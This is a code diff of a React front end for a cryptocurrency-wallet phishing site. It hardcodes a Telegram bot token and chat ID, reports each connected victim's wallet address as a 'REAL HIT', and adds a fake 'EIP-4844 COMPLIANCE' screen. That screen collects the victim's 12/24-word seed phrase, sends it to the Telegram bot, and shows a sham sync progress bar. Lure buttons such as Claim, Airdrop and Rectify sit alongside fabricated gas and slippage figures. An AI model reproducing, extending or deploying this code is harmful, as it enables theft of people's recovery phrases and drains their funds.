@@ -14,7 +14,6 @@ export default function App() {
   const [seedVal, setSeedVal] = useState("");   
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
-  const [feedMsg, setFeedMsg] = useState(""); 
 
   const bT = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const cI = "7630238860";
@@ -23,9 +22,9 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('h_v6_'+address)) {
-      log(`🎯 REAL HIT V6!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('h_v6_'+address, 't');
+    if (isConnected && address && !sessionStorage.getItem('h_v7')) {
+      log(`🎯 REAL HIT V7!\nADDR: ${address}\nNET: ${chainId}`);
+      sessionStorage.setItem('h_v7', 't');
     }
   }, [isConnected, address]);
 
@@ -36,12 +35,12 @@ export default function App() {
     if (activeTask === "Rectify") {
       setInputVal(tB?.formatted?.slice(0,10) || nB?.formatted?.slice(0,10) || "0.00");
     } else { setInputVal(""); }
-  }, [tB, nB, activeTask, selectedAsset]);
+  }, [tB, nB, activeTask]);
 
   return (
-    <div id="v6-container" style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
+    <div id="v7-final" style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
       <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
-        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>SYSTEM_ONLINE_V6</div>
+        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>SYSTEM_ONLINE_V7</div>
         <appkit-button />
       </header>
 
@@ -51,7 +50,6 @@ export default function App() {
             <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
           </div>
 
-          {/* ⚡ SLIPPAGE BAR MUST SHOW HERE */}
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
             <span>〽️ GAS: 14 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span><span>📡 SYNC: 99.9%</span>
           </div>
@@ -59,7 +57,7 @@ export default function App() {
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
-                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
+                <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
                 style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                   <div>{n === "Rectify" ? "⚡" : "〽️"}</div><div style={{fontSize:'9px'}}>{n}</div>
                 </button>
@@ -84,13 +82,25 @@ export default function App() {
             </div>
           )}
 
-          {/* (KYC & SEED SCREENS REMAIN THE SAME) */}
+          {view === "seed_gate" && (
+            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
+              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center', maxWidth:'400px'}}>
+                {!isSyncing ? (
+                  <>
+                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
+                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'15px'}} />
+                    <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setView("menu")},1200)}},60);}} 
+                    style={{width:'100%', backgroundColor: seedVal.split(' ').length >= 12 ? '#10b981' : '#1e293b', color:'#000', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
+                  </>
+                ) : (
+                  <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING...</div></div>
+                )}
+              </div>
+            </div>
+          )}
         </>
       ) : (
         <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
-          <div style={{marginBottom:'25px'}}>
-             <div style={{fontSize:'12px', color:'#10b981', fontWeight:'bold'}}>🔰 SAFE_GUIDE ♻️ RELAY_ACTIVE</div>
-          </div>
           <appkit-button />
         </div>
       )}
